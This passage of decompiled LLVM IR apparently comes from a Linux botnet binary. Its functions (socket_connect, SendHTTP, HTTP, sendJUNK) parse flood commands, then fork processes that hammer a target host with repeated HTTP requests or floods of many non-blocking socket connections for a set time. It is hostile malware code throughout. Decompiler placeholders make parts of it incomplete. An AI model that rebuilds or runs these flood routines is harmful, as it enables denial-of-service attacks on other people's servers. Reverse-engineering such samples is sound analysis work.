  %v0_804fb65 = phi i32 [ %v1_804f803, %entry ], [ %v3_804f895, %dec_label_pc_804f887 ], [ %v1_804fb59, %dec_label_pc_804fb23 ]
  ret i32 %v0_804fb65

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_804fb13, { 1, 0 }
  uselistorder i32 %storemerge42, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v1_804fb19, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v2_804f9c4, { 1, 0, 2 }
  uselistorder i32 %v1_804f94a, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804f8f8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 6, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 ptrtoint (i32* @global_var_806986d.168 to i32), { 4, 5, 6, 2, 0, 3, 1 }
  uselistorder i32 %arg4, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb5e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fa01, { 1, 0 }
  uselistorder label %dec_label_pc_804f938, { 1, 0 }
  uselistorder label %dec_label_pc_804f887, { 1, 2, 3, 4, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804fb80 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804fb8b = icmp eq i32 %v1_804fb80, 0
  %v1_804fb8f = icmp eq i1 %v4_804fb8b, false
  br i1 %v1_804fb8f, label %dec_label_pc_804fb9d, label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %entry
  br label %dec_label_pc_804fc42

dec_label_pc_804fb9d:                             ; preds = %entry
  %v1_804fba0 = add i32 %v1_804fb80, 12
  %v2_804fba0 = inttoptr i32 %v1_804fba0 to i32*
  %v3_804fba0 = load i32, i32* %v2_804fba0, align 4
  %v1_804fba8 = add i32 %v1_804fb80, 16
  %v2_804fba8 = inttoptr i32 %v1_804fba8 to i32*
  %v3_804fba8 = load i32, i32* %v2_804fba8, align 4
  %v1_804fbab = inttoptr i32 %v3_804fba8 to i32*
  %v2_804fbab = load i32, i32* %v1_804fbab, align 4
  %v15_804fbb4 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804fbb9 = call i32 @bcopy(i32 %v2_804fbab, i32 %v15_804fbb4, i32 %v3_804fba0)
  %v1_804fbc41 = zext i16 %arg2 to i32
  %v1_804fbcd = call i32 @htons(i32 %v1_804fbc41)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804fbe8 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804fbf3 = ptrtoint i32* %stack_var_-32 to i32
  %v5_804fc03 = call i32 @__GI_setsockopt(i32 %v3_804fbe8, i32 6, i32 1, i32 %v2_804fbf3, i32 4)
  %v13_804fc0b = icmp eq i32 %v3_804fbe8, -1
  %v1_804fc0f = icmp eq i1 %v13_804fc0b, false
  br i1 %v1_804fc0f, label %dec_label_pc_804fc1a, label %dec_label_pc_804fc11

dec_label_pc_804fc11:                             ; preds = %dec_label_pc_804fb9d
  br label %dec_label_pc_804fc42

dec_label_pc_804fc1a:                             ; preds = %dec_label_pc_804fb9d
  %v2_804fbb1 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804fc26 = call i32 @connect(i32 %v3_804fbe8, i32 %v2_804fbb1, i32 16)
  %v10_804fc2e = icmp eq i32 %v3_804fc26, -1
  %v1_804fc31 = icmp eq i1 %v10_804fc2e, false
  br i1 %v1_804fc31, label %dec_label_pc_804fc3c, label %dec_label_pc_804fc33

dec_label_pc_804fc33:                             ; preds = %dec_label_pc_804fc1a
  br label %dec_label_pc_804fc42

dec_label_pc_804fc3c:                             ; preds = %dec_label_pc_804fc1a
  br label %dec_label_pc_804fc42

dec_label_pc_804fc42:                             ; preds = %dec_label_pc_804fc33, %dec_label_pc_804fc11, %dec_label_pc_804fb91, %dec_label_pc_804fc3c
  %v3_804fc42 = phi i32 [ 0, %dec_label_pc_804fc33 ], [ 0, %dec_label_pc_804fc11 ], [ 0, %dec_label_pc_804fb91 ], [ %v3_804fbe8, %dec_label_pc_804fc3c ]
  ret i32 %v3_804fc42

; uselistorder directives
  uselistorder i32 %v3_804fbe8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804fc42, { 3, 0, 1, 2 }
}

define i32 @SendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-537 = alloca i32, align 4
  %stack_var_-536 = alloca i32, align 4
  %v0_804fc4a = load i32, i32* @edi, align 4
  %v2_804fc60 = call i32 @__GI_time(i32* null)
  %v5_804fc68 = add i32 %v2_804fc60, %arg5
  %v2_804fcc3 = ptrtoint i32* %stack_var_-536 to i32
  %v4_804fd09 = bitcast i32* %stack_var_-536 to i8*
  %v2_804fd31 = ptrtoint i32* %stack_var_-537 to i32
  %v5_804fd7a35 = icmp sgt i32 %arg6, 0
  br i1 %v5_804fd7a35, label %dec_label_pc_804fc81.lr.ph, label %dec_label_pc_804fd80

dec_label_pc_804fc81.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804fc81

dec_label_pc_804fc81:                             ; preds = %dec_label_pc_804fd71, %dec_label_pc_804fc81.lr.ph
  %storemerge36 = phi i32 [ 0, %dec_label_pc_804fc81.lr.ph ], [ %v4_804fd71, %dec_label_pc_804fd71 ]
  %v1_804fc81 = call i32 @fork(i32 %storemerge36)
  %v1_804fc86 = icmp eq i32 %v1_804fc81, 0
  br i1 %v1_804fc86, label %dec_label_pc_804fd71, label %dec_label_pc_804fd51.preheader

dec_label_pc_804fd51.preheader:                   ; preds = %dec_label_pc_804fc81
  br label %dec_label_pc_804fd51

dec_label_pc_804fc93:                             ; preds = %dec_label_pc_804fd51
  %v0_804fc93 = call i32 @random()
  %v3_804fcca = call i32 @sprintf(i32 %v2_804fcc3, i32 ptrtoint ([64 x i8]* @global_var_806a0f8.256 to i32))
  %v3_804fce4 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804fcef = icmp eq i32 %v3_804fce4, 0
  br i1 %v4_804fcef, label %dec_label_pc_804fd51, label %dec_label_pc_804fcf5

dec_label_pc_804fcf5:                             ; preds = %dec_label_pc_804fc93
  store i1 false, i1* @df, align 1
  store i32 %v2_804fcc3, i32* @edi, align 4
  %v3_804fd0f = call i32 @_strlen(i8* %v4_804fd09)
  %v4_804fd0f = mul i32 %v3_804fd0f, -1
  %v5_804fd0f = add i32 %v4_804fd0f, -2
  store i32 %v5_804fd0f, i32* @ecx, align 4
  %v1_804fd15 = sub i32 0, %v4_804fd0f
  %v3_804fd24 = call i32 @write(i32 %v3_804fce4, i32 %v2_804fcc3, i32 %v1_804fd15)
  %v3_804fd3b = call i32 @read(i32 %v3_804fce4, i32 %v2_804fd31, i32 1)
  %v1_804fd49 = call i32 @close(i32 %v3_804fce4)
  br label %dec_label_pc_804fd51

dec_label_pc_804fd51:                             ; preds = %dec_label_pc_804fc93, %dec_label_pc_804fcf5, %dec_label_pc_804fd51.preheader
  %v2_804fd56 = call i32 @__GI_time(i32* null)
  %v5_804fd61 = icmp slt i32 %v2_804fd56, %v5_804fc68
  br i1 %v5_804fd61, label %dec_label_pc_804fc93, label %dec_label_pc_804fd67

dec_label_pc_804fd67:                             ; preds = %dec_label_pc_804fd51
  %v1_804fd6c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fd71

dec_label_pc_804fd71:                             ; preds = %dec_label_pc_804fc81, %dec_label_pc_804fd67
  %v4_804fd71 = add nuw nsw i32 %storemerge36, 1
  %exitcond = icmp eq i32 %v4_804fd71, %arg6
  br i1 %exitcond, label %dec_label_pc_804fd80, label %dec_label_pc_804fc81

dec_label_pc_804fd80:                             ; preds = %dec_label_pc_804fd71, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804fd71 ]
  store i32 %v0_804fc4a, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %storemerge36, { 1, 0 }
  uselistorder label %dec_label_pc_804fd71, { 1, 0 }
  uselistorder label %dec_label_pc_804fd51, { 1, 0, 2 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fd94 = call i32 @mfork(i32 %arg2)
  %v1_804fd9c = icmp eq i32 %v1_804fd94, 0
  %v1_804fd9e = icmp eq i1 %v1_804fd9c, false
  br i1 %v1_804fd9e, label %dec_label_pc_804fe6d, label %dec_label_pc_804fda4

dec_label_pc_804fda4:                             ; preds = %entry
  %v7_804fda8 = icmp sgt i32 %arg3, 5
  br i1 %v7_804fda8, label %dec_label_pc_804fdaa, label %dec_label_pc_804fdda

dec_label_pc_804fdaa:                             ; preds = %dec_label_pc_804fda4
  %v1_804fdad = add i32 %arg4, 12
  %v1_804fdb0 = inttoptr i32 %v1_804fdad to i32*
  %v2_804fdb0 = load i32, i32* %v1_804fdb0, align 4
  %v1_804fdb6 = call i32 @atol(i32 %v2_804fdb0)
  %tmp21 = icmp slt i32 %v1_804fdb6, 1
  br i1 %tmp21, label %dec_label_pc_804fdda, label %dec_label_pc_804fdc2

dec_label_pc_804fdc2:                             ; preds = %dec_label_pc_804fdaa
  %v1_804fdc5 = add i32 %arg4, 20
  %v1_804fdc8 = inttoptr i32 %v1_804fdc5 to i32*
  %v2_804fdc8 = load i32, i32* %v1_804fdc8, align 4
  %v1_804fdce = call i32 @atol(i32 %v2_804fdc8)
  %tmp22 = icmp slt i32 %v1_804fdce, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804fdf2, label %dec_label_pc_804fdda

dec_label_pc_804fdda:                             ; preds = %dec_label_pc_804fda4, %dec_label_pc_804fdc2, %dec_label_pc_804fdaa
  %v3_804fde8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_806a138.257 to i32))
  br label %dec_label_pc_804fe6d

dec_label_pc_804fdf2:                             ; preds = %dec_label_pc_804fdc2
  %v1_804fdf5 = add i32 %arg4, 24
  %v1_804fdf8 = inttoptr i32 %v1_804fdf5 to i32*
  %v2_804fdf8 = load i32, i32* %v1_804fdf8, align 4
  %v1_804fdfe = call i32 @atol(i32 %v2_804fdf8)
  store i32 %v1_804fdfe, i32* @ebx, align 4
  %v2_804fe0e = load i32, i32* %v1_804fdc8, align 4
  %v1_804fe14 = call i32 @atol(i32 %v2_804fe0e)
  store i32 %v1_804fe14, i32* @esi, align 4
  %v1_804fe21 = add i32 %arg4, 16
  %v1_804fe24 = inttoptr i32 %v1_804fe21 to i32*
  %v2_804fe24 = load i32, i32* %v1_804fe24, align 4
  store i32 %v2_804fe24, i32* @edi, align 4
  %v2_804fe2c = load i32, i32* %v1_804fdb0, align 4
  %v1_804fe32 = call i32 @atol(i32 %v2_804fe2c)
  %v1_804fe45 = add i32 %arg4, 8
  %v1_804fe48 = inttoptr i32 %v1_804fe45 to i32*
  %v2_804fe48 = load i32, i32* %v1_804fe48, align 4
  %v1_804fe4d = add i32 %arg4, 4
  %v1_804fe50 = inttoptr i32 %v1_804fe4d to i32*
  %v2_804fe50 = load i32, i32* %v1_804fe50, align 4
  %v0_804fe55 = load i32, i32* @ebx, align 4
  %v0_804fe56 = load i32, i32* @esi, align 4
  %v0_804fe57 = load i32, i32* @edi, align 4
  %v7_804fe5b = trunc i32 %v1_804fe32 to i16
  %v8_804fe5b = call i32 @SendHTTP(i32 %v2_804fe50, i32 %v2_804fe48, i16 %v7_804fe5b, i32 %v0_804fe57, i32 %v0_804fe56, i32 %v0_804fe55)
  %v1_804fe68 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fe6d

dec_label_pc_804fe6d:                             ; preds = %entry, %dec_label_pc_804fdda, %dec_label_pc_804fdf2
  %v0_804fe74 = phi i32 [ %v1_804fd94, %entry ], [ %v3_804fde8, %dec_label_pc_804fdda ], [ %v1_804fe68, %dec_label_pc_804fdf2 ]
  ret i32 %v0_804fe74

; uselistorder directives
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe6d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fdda, { 1, 2, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v12_804fe7a = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804fe7a, i32* %eax.global-to-local, align 4
  %v1_804fe88 = call i32 @getdtablesize(i32 %v12_804fe7a)
  store i32 %v1_804fe88, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804fe88, 0
  %v2_804fe91 = zext i1 %tmp to i32
  %v2_804fe94 = add i32 %v2_804fe91, %v1_804fe88
  %v2_804fe96 = sdiv i32 %v2_804fe94, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_804fea4 = urem i32 %arg2, 65536
  store i32 %v1_804fea4, i32* %eax.global-to-local, align 4
  %v1_804fead = call i32 @htons(i32 %v1_804fea4)
  %v2_804febc = ptrtoint i32* %stack_var_-64 to i32
  %v15_804febf = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_804febf, i32* %eax.global-to-local, align 4
  %v3_804fec6 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_804fec6, i32* %eax.global-to-local, align 4
  %v1_804fece = icmp eq i32 %v3_804fec6, 0
  br i1 %v1_804fece, label %dec_label_pc_804fed7, label %dec_label_pc_8050233

dec_label_pc_804fed7:                             ; preds = %entry
  %v15_804fee1 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804fee1, i32* %eax.global-to-local, align 4
  %v3_804fee5 = bitcast i32* %stack_var_-56 to i8*
  %v4_804fee5 = call i32 @__GI_memset(i8* %v3_804fee5, i32 0, i32 8)
  %v2_804fef0 = mul i32 %v2_804fe96, 8
  %v1_804fef6 = add i32 %v2_804fef0, 30
  %v2_804fef9 = and i32 %v1_804fef6, -16
  %v2_804feff = sub i32 %v12_804fe7a, %v2_804fef9
  %v1_804ff0d = add i32 %v2_804feff, 15
  %v2_804ff10 = and i32 %v1_804ff0d, -16
  %v2_804ff2d = mul i32 %v2_804fe96, 5
  store i32 %v2_804ff2d, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff10, i32* %edx.global-to-local, align 4
  %v2_804ff35 = add i32 %v2_804feff, -8
  %v3_804ff35 = inttoptr i32 %v2_804ff35 to i32*
  store i32 %v2_804ff2d, i32* %v3_804ff35, align 4
  %v1_804ff36 = add i32 %v2_804feff, -12
  %v2_804ff36 = inttoptr i32 %v1_804ff36 to i32*
  store i32 0, i32* %v2_804ff36, align 4
  %v0_804ff38 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ff38 = add i32 %v2_804feff, -16
  %v3_804ff38 = inttoptr i32 %v2_804ff38 to i32*
  store i32 %v0_804ff38, i32* %v3_804ff38, align 4
  %v3_804ff39 = inttoptr i32 %v2_804ff10 to i8*
  %v4_804ff39 = call i32 @__GI_memset(i8* %v3_804ff39, i32 %tmp7, i32 %v12_804fe7a)
  store i32 %v4_804ff39, i32* %eax.global-to-local, align 4
  %v0_804ff3e = load i32, i32* @esp, align 4
  %v2_804ff44 = inttoptr i32 %v0_804ff3e to i32*
  store i32 8192, i32* %v2_804ff44, align 4
  %v1_804ff49 = call i32 @malloc(i32 %v2_804ff10)
  store i32 %v1_804ff49, i32* %eax.global-to-local, align 4
  %v0_804ff4e = load i32, i32* @esp, align 4
  %v1_804ff57 = add i32 %v0_804ff4e, 8
  %v2_804ff57 = inttoptr i32 %v1_804ff57 to i32*
  store i32 8192, i32* %v2_804ff57, align 4
  %v1_804ff5c = add i32 %v0_804ff4e, 4
  %v2_804ff5c = inttoptr i32 %v1_804ff5c to i32*
  store i32 0, i32* %v2_804ff5c, align 4
  %v6_804ff5e = inttoptr i32 %v0_804ff4e to i32*
  store i32 %v1_804ff49, i32* %v6_804ff5e, align 4
  %v3_804ff61 = inttoptr i32 %v1_804ff49 to i8*
  %v4_804ff61 = call i32 @__GI_memset(i8* %v3_804ff61, i32 %tmp11, i32 %tmp9)
  store i32 %v4_804ff61, i32* %eax.global-to-local, align 4
  %v0_804ff66 = load i32, i32* @esp, align 4
  %v2_804ff73 = inttoptr i32 %v0_804ff66 to i32*
  store i32 0, i32* %v2_804ff73, align 4
  %v2_804ff75 = call i32 @__GI_time(i32* inttoptr (i32 1024 to i32*))
  %v0_804ff7a = load i32, i32* @esp, align 4
  %v1_804ff7a = add i32 %v0_804ff7a, 16
  %v5_804ff7d = add i32 %v2_804ff75, %arg3
  store i32 %v5_804ff7d, i32* %eax.global-to-local, align 4
  %v3_804ff9a = or i32 %v2_804ff10, 4
  %v2_8050085 = ptrtoint i32* %stack_var_-192 to i32
  %tmp36 = bitcast i32* %stack_var_-192 to i8*
  %v2_80500d9 = ptrtoint i32* %stack_var_-200 to i32
  %v2_8050113 = ptrtoint i32* %stack_var_-204 to i32
  %v2_805011a = ptrtoint i32* %stack_var_-208 to i32
  %v5_805021743 = icmp sgt i32 %v2_804fe94, 1
  br label %dec_label_pc_805021d

dec_label_pc_804ff94:                             ; preds = %dec_label_pc_8050211.preheader, %dec_label_pc_805020e
  %storemerge46 = phi i32 [ %v4_805020e, %dec_label_pc_805020e ], [ 0, %dec_label_pc_8050211.preheader ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.0, %dec_label_pc_805020e ], [ %stack_var_-20.2, %dec_label_pc_8050211.preheader ]
  %stack_var_-16.144 = phi i32 [ %stack_var_-16.0, %dec_label_pc_805020e ], [ %stack_var_-16.2, %dec_label_pc_8050211.preheader ]
  store i32 %storemerge46, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff10, i32* %edx.global-to-local, align 4
  %v2_804ff9a = mul i32 %storemerge46, 8
  %v4_804ff9a = add i32 %v2_804ff9a, %v3_804ff9a
  %v5_804ff9a = inttoptr i32 %v4_804ff9a to i8*
  %v6_804ff9a = load i8, i8* %v5_804ff9a, align 4
  %v7_804ff9a = zext i8 %v6_804ff9a to i32
  %v9_804ff9a = and i32 %storemerge46, -256
  %v10_804ff9a = or i32 %v7_804ff9a, %v9_804ff9a
  store i32 %v10_804ff9a, i32* %eax.global-to-local, align 4
  store i32 %v7_804ff9a, i32* %edx.global-to-local, align 4
  %v8_804ffab = icmp eq i8 %v6_804ff9a, 0
  %v12_804ffab = icmp eq i8 %v6_804ff9a, 1
  br i1 %v12_804ffab, label %dec_label_pc_805007b, label %dec_label_pc_804ffb8

dec_label_pc_804ffb8:                             ; preds = %dec_label_pc_804ff94
  %v12_804ffb8 = icmp eq i8 %v6_804ff9a, 2
  br i1 %v12_804ffb8, label %dec_label_pc_8050199, label %dec_label_pc_804ffc5

dec_label_pc_804ffc5:                             ; preds = %dec_label_pc_804ffb8
  br i1 %v8_804ffab, label %dec_label_pc_804ffd3, label %dec_label_pc_805020e

dec_label_pc_804ffd3:                             ; preds = %dec_label_pc_804ffc5
  store i32 %storemerge46, i32* @ebx, align 4
  %v0_804ffd6 = load i32, i32* @esp, align 4
  %v1_804ffd9 = add i32 %v0_804ffd6, -8
  %v2_804ffd9 = inttoptr i32 %v1_804ffd9 to i32*
  store i32 0, i32* %v2_804ffd9, align 4
  %v1_804ffdb = add i32 %v0_804ffd6, -12
  %v2_804ffdb = inttoptr i32 %v1_804ffdb to i32*
  store i32 1, i32* %v2_804ffdb, align 4
  %v1_804ffdd = add i32 %v0_804ffd6, -16
  %v2_804ffdd = inttoptr i32 %v1_804ffdd to i32*
  store i32 2, i32* %v2_804ffdd, align 4
  %v3_804ffdf = call i32 @socket(i32 %v7_804ff9a, i32 %v12_804fe7a, i32 ptrtoint (i32* @0 to i32))
  %v2_804ffec = load i32, i32* @ebx, align 4
  %v3_804ffec = mul i32 %v2_804ffec, 8
  %v4_804ffec = add i32 %v3_804ffec, %v2_804ff10
  %v5_804ffec = inttoptr i32 %v4_804ffec to i32*
  store i32 %v3_804ffdf, i32* %v5_804ffec, align 8
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v3_804fff5 = add i32 %v2_804ff9a, %v2_804ff10
  %v4_804fff5 = inttoptr i32 %v3_804fff5 to i32*
  %v5_804fff5 = load i32, i32* %v4_804fff5, align 8
  store i32 %v5_804fff5, i32* %eax.global-to-local, align 4
  %v0_804fff8 = load i32, i32* @esp, align 4
  %v1_804fffb = add i32 %v0_804fff8, -8
  %v2_804fffb = inttoptr i32 %v1_804fffb to i32*
  store i32 0, i32* %v2_804fffb, align 4
  %v1_804fffd = add i32 %v0_804fff8, -12
  %v2_804fffd = inttoptr i32 %v1_804fffd to i32*
  store i32 3, i32* %v2_804fffd, align 4
  %v0_804ffff = load i32, i32* %eax.global-to-local, align 4
  %v2_804ffff = add i32 %v0_804fff8, -16
  %v3_804ffff = inttoptr i32 %v2_804ffff to i32*
  store i32 %v0_804ffff, i32* %v3_804ffff, align 4
  %v1_8050000 = call i32 @fcntl(i32 %v7_804ff9a)
  %v0_8050005 = load i32, i32* @esp, align 4
  %v12_805000a = or i32 %v1_8050000, 2048
  store i32 %v12_805000a, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_8050013 = load i32, i32* %v4_804fff5, align 8
  store i32 %v5_8050013, i32* %eax.global-to-local, align 4
  %v2_8050019 = add i32 %v0_8050005, 8
  %v3_8050019 = inttoptr i32 %v2_8050019 to i32*
  store i32 %v12_805000a, i32* %v3_8050019, align 4
  %v1_805001a = add i32 %v0_8050005, 4
  %v2_805001a = inttoptr i32 %v1_805001a to i32*
  store i32 4, i32* %v2_805001a, align 4
  %v0_805001c = load i32, i32* %eax.global-to-local, align 4
  %v3_805001c = inttoptr i32 %v0_8050005 to i32*
  store i32 %v0_805001c, i32* %v3_805001c, align 4
  %v1_805001d = call i32 @fcntl(i32 %v7_804ff9a)
  %v0_8050022 = load i32, i32* @esp, align 4
  store i32 %v2_804febc, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_805002e = load i32, i32* %v4_804fff5, align 8
  store i32 %v5_805002e, i32* %eax.global-to-local, align 4
  %v1_8050034 = add i32 %v0_8050022, 8
  %v2_8050034 = inttoptr i32 %v1_8050034 to i32*
  store i32 16, i32* %v2_8050034, align 4
  %v2_8050036 = add i32 %v0_8050022, 4
  %v3_8050036 = inttoptr i32 %v2_8050036 to i32*
  store i32 %v2_804febc, i32* %v3_8050036, align 4
  %v0_8050037 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050037 = inttoptr i32 %v0_8050022 to i32*
  store i32 %v0_8050037, i32* %v3_8050037, align 4
  %v3_8050038 = call i32 @connect(i32 %v7_804ff9a, i32 %v12_804fe7a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050038, i32* %eax.global-to-local, align 4
  %v0_805003d = load i32, i32* @esp, align 4
  %v1_805003d = add i32 %v0_805003d, 16
  %v10_8050040 = icmp eq i32 %v3_8050038, -1
  %v1_8050043 = icmp eq i1 %v10_8050040, false
  br i1 %v1_8050043, label %dec_label_pc_8050051, label %dec_label_pc_8050045

dec_label_pc_8050045:                             ; preds = %dec_label_pc_804ffd3
  %v1_8050045 = call i32 @__errno_location(i32 %v7_804ff9a)
  store i32 %v1_8050045, i32* %eax.global-to-local, align 4
  %v1_805004a = inttoptr i32 %v1_8050045 to i32*
  %v2_805004a = load i32, i32* %v1_805004a, align 4
  store i32 %v2_805004a, i32* %eax.global-to-local, align 4
  %v9_805004c = icmp eq i32 %v2_805004a, 115
  br i1 %v9_805004c, label %dec_label_pc_805006b, label %dec_label_pc_8050045.dec_label_pc_8050051_crit_edge

dec_label_pc_8050045.dec_label_pc_8050051_crit_edge: ; preds = %dec_label_pc_8050045
  %v0_805005a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050051

dec_label_pc_8050051:                             ; preds = %dec_label_pc_8050045.dec_label_pc_8050051_crit_edge, %dec_label_pc_804ffd3
  %v0_805005a = phi i32 [ %v0_805005a.pre, %dec_label_pc_8050045.dec_label_pc_8050051_crit_edge ], [ %v1_805003d, %dec_label_pc_804ffd3 ]
  store i32 %storemerge46, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff10, i32* %edx.global-to-local, align 4
  %v5_8050057 = load i32, i32* %v4_804fff5, align 8
  store i32 %v5_8050057, i32* %eax.global-to-local, align 4
  %v2_805005d = add i32 %v0_805005a, -16
  %v3_805005d = inttoptr i32 %v2_805005d to i32*
  store i32 %v5_8050057, i32* %v3_805005d, align 4
  %v1_805005e = call i32 @close(i32 %v7_804ff9a)
  store i32 %v1_805005e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805020e

dec_label_pc_805006b:                             ; preds = %dec_label_pc_8050045
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804ff9a, align 4
  br label %dec_label_pc_805020e

dec_label_pc_805007b:                             ; preds = %dec_label_pc_804ff94
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050085, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805008c = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v6_805008c = ptrtoint i8* %v5_805008c to i32
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v3_805009a = add i32 %v2_804ff9a, %v2_804ff10
  %v4_805009a = inttoptr i32 %v3_805009a to i32*
  %v5_805009a = load i32, i32* %v4_805009a, align 8
  %v2_805009f = udiv i32 %v5_805009a, 32
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_80500a8 = load i32, i32* %v4_805009a, align 8
  %v1_80500ab = urem i32 %v5_80500a8, 32
  store i32 %v1_80500ab, i32* %eax.global-to-local, align 4
  %v0_80500ae = load i32, i32* @ebp, align 4
  %v2_80500ae = mul nuw nsw i32 %v2_805009f, 4
  %v3_80500ae = add nsw i32 %v2_80500ae, -188
  %v4_80500ae = add i32 %v3_80500ae, %v0_80500ae
  %v5_80500ae = inttoptr i32 %v4_80500ae to i32*
  %v6_80500ae = load i32, i32* %v5_80500ae, align 4
  %v9_80500ae = shl i32 1, %v1_80500ab
  %v12_80500ae = or i32 %v6_80500ae, %v9_80500ae
  store i32 %v12_80500ae, i32* %v5_80500ae, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_80500d0 = load i32, i32* %v4_805009a, align 8
  %v1_80500d3 = add i32 %v5_80500d0, 1
  store i32 %v1_80500d3, i32* %edx.global-to-local, align 4
  %v0_80500d6 = load i32, i32* @esp, align 4
  %v2_80500df = add i32 %v0_80500d6, -16
  %v3_80500df = inttoptr i32 %v2_80500df to i32*
  store i32 %v2_80500d9, i32* %v3_80500df, align 4
  %v1_80500e0 = add i32 %v0_80500d6, -20
  %v2_80500e0 = inttoptr i32 %v1_80500e0 to i32*
  store i32 0, i32* %v2_80500e0, align 4
  store i32 %v2_8050085, i32* %eax.global-to-local, align 4
  %v2_80500e8 = add i32 %v0_80500d6, -24
  %v3_80500e8 = inttoptr i32 %v2_80500e8 to i32*
  store i32 %v2_8050085, i32* %v3_80500e8, align 4
  %v1_80500e9 = add i32 %v0_80500d6, -28
  %v2_80500e9 = inttoptr i32 %v1_80500e9 to i32*
  store i32 0, i32* %v2_80500e9, align 4
  %v0_80500eb = load i32, i32* %edx.global-to-local, align 4
  %v2_80500eb = add i32 %v0_80500d6, -32
  %v3_80500eb = inttoptr i32 %v2_80500eb to i32*
  store i32 %v0_80500eb, i32* %v3_80500eb, align 4
  %v0_80500ec = load i32, i32* %stack_var_-200, align 4
  %v2_80500ec = load i32, i32* %stack_var_-192, align 4
